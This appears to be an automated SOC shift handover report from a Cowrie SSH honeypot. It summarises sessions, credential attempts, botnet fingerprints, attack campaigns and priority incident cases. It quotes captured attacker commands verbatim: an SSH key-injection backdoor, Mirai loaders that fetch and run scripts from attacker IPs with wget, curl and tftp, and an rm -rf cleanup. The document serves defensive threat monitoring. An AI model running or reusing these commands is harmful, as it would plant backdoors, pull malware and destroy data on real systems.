# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-06 |
| **Generated At** | 2026-10-06T17:34:35Z |
| **Shift Time** | 17:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **492** |
| Confirmed Threats | **452** |
| False Positives Filtered | **40** (8.1%) |
| Unique Attacker IPs | **321** |
| Countries of Origin | **57** |
| High Severity Cases | **284** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **208** |
| Malware Samples Analyzed | **5** HIGH · **25** MED · 13 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **4551** |
| Unique Credential Pairs | **4202** |
| Unique Usernames | **2069** |
| Unique Passwords | **1712** |
| Successful Auth Pairs | **4381** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 266 |
| `345gs5662d34` | 109 |
| `ubuntu` | 82 |
| `support` | 41 |
| `admin` | 32 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 110 |
| `345gs5662d34` | 109 |
| `support` | 31 |
| `123456` | 29 |
| `` | 27 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 109 |
| `root` | `3245gs5662d34` | 43 |
| `support` | `support` | 28 |
| `root` | `` | 12 |
| `admin` | `admin` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `keitaro-support` | `femi` | `109.160.32.169` | 2026-10-06T02:55:07 |
| `pzserver` | `assistant` | `109.160.32.169` | 2026-10-06T02:55:12 |
| `backuply` | `19830602` | `109.160.32.169` | 2026-10-06T02:55:17 |
| `first` | `demo` | `109.160.32.169` | 2026-10-06T02:55:22 |
| `foundry` | `happy1314` | `109.160.32.169` | 2026-10-06T02:55:27 |
| `fahimeh` | `vastai` | `109.160.32.169` | 2026-10-06T02:55:32 |
| `songtao` | `Qwerty123?` | `109.160.32.169` | 2026-10-06T02:55:38 |
| `deploy` | `1q2w3e4r5t` | `10.0.0.73` | 2026-10-06T02:55:43 |
| `gl15` | `butter` | `109.160.32.169` | 2026-10-06T02:55:44 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-10-06T02:55:44 |
| `deploy` | `3245gs5662d34` | `10.0.0.73` | 2026-10-06T02:55:44 |
| `alpine` | `leonardo` | `109.160.32.169` | 2026-10-06T02:55:48 |
| `user37` | `root@` | `109.160.32.169` | 2026-10-06T02:55:53 |
| `saeid-j` | `Huawei@2025` | `109.160.32.169` | 2026-10-06T02:55:58 |
| `jfedu1` | `data@123` | `109.160.32.169` | 2026-10-06T02:56:03 |
| `s7steph` | `christianna` | `109.160.32.169` | 2026-10-06T02:56:08 |
| `bb` | `ctf` | `109.160.32.169` | 2026-10-06T02:56:13 |
| `juhauxill` | `logs` | `109.160.32.169` | 2026-10-06T02:56:18 |
| `tob` | `123456qq@` | `109.160.32.169` | 2026-10-06T02:56:23 |
| `us21` | `tactical` | `109.160.32.169` | 2026-10-06T02:56:28 |
_… 4361 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **492** |
| Sessions with Fingerprint | **31** |
| Unique HASSH Fingerprints | **31** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 179 |
| Go SSH scanner | 73 |
| OpenSSH | 63 |
| Paramiko (Python) | 5 |
| Unknown | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 131 | 68 |
| `acaa53e0a7d7...` | Mirai/variant | 60 | 58 |
| `03a80b21afa8...` | Modern SSH client | 21 | 10 |
| `0a07365cc01f...` | Generic scanner | 16 | 8 |
| `16443846184e...` | Generic scanner | 9 | 5 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 131 | 68 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 60 | 58 | Mirai/variant |
| `03a80b21afa8...` | libssh | 21 | 10 | Modern SSH client |
| `95420f9d932d...` | libssh | 20 | 18 | — |
| `0a07365cc01f...` | Go SSH scanner | 16 | 8 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 9 | 5 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 7 | 7 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **25** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 33 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1082, T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 10 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 67 | 65 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "liviu\n01Wa3wH8j42r\n01Wa3wH8j42r"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `194.226.49.237`, `58.42.8.7`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`, `193.32.162.84`, `92.118.39.77`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp
```
```
wget -qO /tmp/.i.sh http://176.65.134.119:80/agent_i.sh
```
```
ls /tmp/.i.sh
```
```
ls /tmp/.i.sh || curl -o /tmp/.i.sh http://176.65.134.119:80/agent_i.sh
```
```
sh /tmp/.i.sh 176.65.134.119:80 http://176.65.134.119:80 armv7 70 58
```
Source IPs: `176.65.134.119`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **321** |
| Unique ASNs | **142** |
| High-Risk ASNs | **124** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 57 | HIGH |
| `AS4134` | CHINANET BACKBONE | 14 | HIGH |
| `AS396982` | Google LLC | 12 | HIGH |
| `AS398324` | Censys, Inc. | 9 | HIGH |
| `AS198364` | BANATSYNC SRL | 9 | HIGH |
| `AS63949` | Akamai Connected Cloud | 8 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 6 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 6 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (279)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-61d0e6099871

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]169` |
| **First Seen** | 2026-10-06 02:55 |
| **Last Seen** | 2026-10-06 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 02:55:06` | `cowrie.session.connect` |
| `2026-10-06 02:55:06` | `cowrie.client.version` |
| `2026-10-06 02:55:06` | `cowrie.client.kex` |
| `2026-10-06 02:55:07` | `cowrie.login.success` |
| `2026-10-06 02:55:08` | `cowrie.session.params` |
| `2026-10-06 02:55:08` | `cowrie.command.input` |
| `2026-10-06 02:55:08` | `cowrie.log.closed` |
| `2026-10-06 02:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]169` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa6741049aa

| Field | Detail |
|---|---|
| **Source IP** | `2.188.206[.]146` |
| **First Seen** | 2026-10-06 02:58 |
| **Last Seen** | 2026-10-06 02:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 02:58:10` | `cowrie.session.connect` |
| `2026-10-06 02:58:10` | `cowrie.client.version` |
| `2026-10-06 02:58:10` | `cowrie.client.kex` |
| `2026-10-06 02:58:12` | `cowrie.login.success` |
| `2026-10-06 02:58:13` | `cowrie.session.params` |
| `2026-10-06 02:58:13` | `cowrie.command.input` |
| `2026-10-06 02:58:14` | `cowrie.log.closed` |
| `2026-10-06 02:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.188.206[.]146` to AbuseIPDB if not already reported
- [ ] Block `2.188.206[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7f937948396

| Field | Detail |
|---|---|
| **Source IP** | `122.160.103[.]228` |
| **First Seen** | 2026-10-06 02:58 |
| **Last Seen** | 2026-10-06 02:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 02:58:27` | `cowrie.session.connect` |
| `2026-10-06 02:58:27` | `cowrie.client.version` |
| `2026-10-06 02:58:27` | `cowrie.client.kex` |
| `2026-10-06 02:58:29` | `cowrie.login.success` |
| `2026-10-06 02:58:29` | `cowrie.direct-tcpip.request` |
| `2026-10-06 02:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.103[.]228` to AbuseIPDB if not already reported
- [ ] Block `122.160.103[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1b03b408f8

| Field | Detail |
|---|---|
| **Source IP** | `210.195.34[.]89` |
| **First Seen** | 2026-10-06 02:58 |
| **Last Seen** | 2026-10-06 02:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 02:58:35` | `cowrie.session.connect` |
| `2026-10-06 02:58:36` | `cowrie.client.version` |
| `2026-10-06 02:58:36` | `cowrie.client.kex` |
| `2026-10-06 02:58:38` | `cowrie.login.success` |
| `2026-10-06 02:58:38` | `cowrie.direct-tcpip.request` |
| `2026-10-06 02:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.195.34[.]89` to AbuseIPDB if not already reported
- [ ] Block `210.195.34[.]89` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a22a6ba41a4a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-10-06 03:04 |
| **Last Seen** | 2026-10-06 03:04 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:04:11` | `cowrie.session.connect` |
| `2026-10-06 03:04:11` | `cowrie.login.success` |
| `2026-10-06 03:04:12` | `cowrie.session.params` |
| `2026-10-06 03:04:13` | `cowrie.command.input` |
| `2026-10-06 03:04:13` | `cowrie.command.input` |
| `2026-10-06 03:04:13` | `cowrie.session.file_download` |
| `2026-10-06 03:04:13` | `cowrie.session.file_download` |
| `2026-10-06 03:04:14` | `cowrie.session.file_download` |
| `2026-10-06 03:04:14` | `cowrie.session.file_download` |
| `2026-10-06 03:04:14` | `cowrie.session.file_download.failed` |
| `2026-10-06 03:04:15` | `cowrie.session.file_download` |
| `2026-10-06 03:04:15` | `cowrie.session.file_download` |
| `2026-10-06 03:04:28` | `cowrie.log.closed` |
| `2026-10-06 03:04:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-944793a9f48f

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-10-06 03:12 |
| **Last Seen** | 2026-10-06 03:12 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:12:22` | `cowrie.session.connect` |
| `2026-10-06 03:12:22` | `cowrie.login.success` |
| `2026-10-06 03:12:23` | `cowrie.session.params` |
| `2026-10-06 03:12:24` | `cowrie.command.input` |
| `2026-10-06 03:12:24` | `cowrie.command.input` |
| `2026-10-06 03:12:25` | `cowrie.session.file_download` |
| `2026-10-06 03:12:25` | `cowrie.session.file_download` |
| `2026-10-06 03:12:25` | `cowrie.session.file_download` |
| `2026-10-06 03:12:25` | `cowrie.session.file_download` |
| `2026-10-06 03:12:25` | `cowrie.session.file_download.failed` |
| `2026-10-06 03:12:25` | `cowrie.session.file_download` |
| `2026-10-06 03:12:25` | `cowrie.session.file_download` |
| `2026-10-06 03:12:39` | `cowrie.log.closed` |
| `2026-10-06 03:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae83d8db7699

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-06 03:19 |
| **Last Seen** | 2026-10-06 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:19:04` | `cowrie.session.connect` |
| `2026-10-06 03:19:04` | `cowrie.client.version` |
| `2026-10-06 03:19:04` | `cowrie.client.kex` |
| `2026-10-06 03:19:05` | `cowrie.login.success` |
| `2026-10-06 03:19:05` | `cowrie.direct-tcpip.request` |
| `2026-10-06 03:19:05` | `cowrie.direct-tcpip.data` |
| `2026-10-06 03:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7689b98f8438

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]128` |
| **First Seen** | 2026-10-06 03:28 |
| **Last Seen** | 2026-10-06 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:28:06` | `cowrie.session.connect` |
| `2026-10-06 03:28:06` | `cowrie.client.version` |
| `2026-10-06 03:28:07` | `cowrie.client.kex` |
| `2026-10-06 03:28:07` | `cowrie.login.success` |
| `2026-10-06 03:28:08` | `cowrie.session.params` |
| `2026-10-06 03:28:08` | `cowrie.command.input` |
| `2026-10-06 03:28:08` | `cowrie.log.closed` |
| `2026-10-06 03:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]128` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03d97fb5b14

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]225` |
| **First Seen** | 2026-10-06 03:32 |
| **Last Seen** | 2026-10-06 03:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:32:21` | `cowrie.session.connect` |
| `2026-10-06 03:32:21` | `cowrie.client.version` |
| `2026-10-06 03:32:21` | `cowrie.client.kex` |
| `2026-10-06 03:32:21` | `cowrie.login.success` |
| `2026-10-06 03:32:22` | `cowrie.session.params` |
| `2026-10-06 03:32:22` | `cowrie.command.input` |
| `2026-10-06 03:32:22` | `cowrie.command.failed` |
| `2026-10-06 03:32:22` | `cowrie.log.closed` |
| `2026-10-06 03:32:23` | `cowrie.session.params` |
| `2026-10-06 03:32:23` | `cowrie.command.input` |
| `2026-10-06 03:32:23` | `cowrie.session.file_download` |
| `2026-10-06 03:32:23` | `cowrie.log.closed` |
| `2026-10-06 03:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]225` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f086282902d7

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]225` |
| **First Seen** | 2026-10-06 03:32 |
| **Last Seen** | 2026-10-06 03:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:32:23` | `cowrie.session.connect` |
| `2026-10-06 03:32:23` | `cowrie.client.version` |
| `2026-10-06 03:32:23` | `cowrie.client.kex` |
| `2026-10-06 03:32:24` | `cowrie.login.success` |
| `2026-10-06 03:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]225` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47bb3fb18aa4

| Field | Detail |
|---|---|
| **Source IP** | `59.36.72[.]234` |
| **First Seen** | 2026-10-06 03:32 |
| **Last Seen** | 2026-10-06 03:36 |
| **Session Duration** | 255s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:32:26` | `cowrie.session.connect` |
| `2026-10-06 03:32:26` | `cowrie.client.version` |
| `2026-10-06 03:32:27` | `cowrie.client.kex` |
| `2026-10-06 03:32:28` | `cowrie.login.success` |
| `2026-10-06 03:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.36.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `59.36.72[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b0dde3fa02a

| Field | Detail |
|---|---|
| **Source IP** | `185.206.32[.]100` |
| **First Seen** | 2026-10-06 03:33 |
| **Last Seen** | 2026-10-06 03:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:33:39` | `cowrie.session.connect` |
| `2026-10-06 03:33:39` | `cowrie.client.version` |
| `2026-10-06 03:33:39` | `cowrie.client.kex` |
| `2026-10-06 03:33:40` | `cowrie.login.success` |
| `2026-10-06 03:33:41` | `cowrie.session.params` |
| `2026-10-06 03:33:41` | `cowrie.command.input` |
| `2026-10-06 03:33:41` | `cowrie.command.failed` |
| `2026-10-06 03:33:41` | `cowrie.log.closed` |
| `2026-10-06 03:33:42` | `cowrie.session.params` |
| `2026-10-06 03:33:42` | `cowrie.command.input` |
| `2026-10-06 03:33:42` | `cowrie.session.file_download` |
| `2026-10-06 03:33:42` | `cowrie.log.closed` |
| `2026-10-06 03:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.206.32[.]100` to AbuseIPDB if not already reported
- [ ] Block `185.206.32[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65ab36313d9

| Field | Detail |
|---|---|
| **Source IP** | `185.206.32[.]100` |
| **First Seen** | 2026-10-06 03:33 |
| **Last Seen** | 2026-10-06 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:33:42` | `cowrie.session.connect` |
| `2026-10-06 03:33:43` | `cowrie.client.version` |
| `2026-10-06 03:33:43` | `cowrie.client.kex` |
| `2026-10-06 03:33:43` | `cowrie.login.success` |
| `2026-10-06 03:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.206.32[.]100` to AbuseIPDB if not already reported
- [ ] Block `185.206.32[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d5d144b981

| Field | Detail |
|---|---|
| **Source IP** | `194.226.49[.]237` |
| **First Seen** | 2026-10-06 03:35 |
| **Last Seen** | 2026-10-06 03:35 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
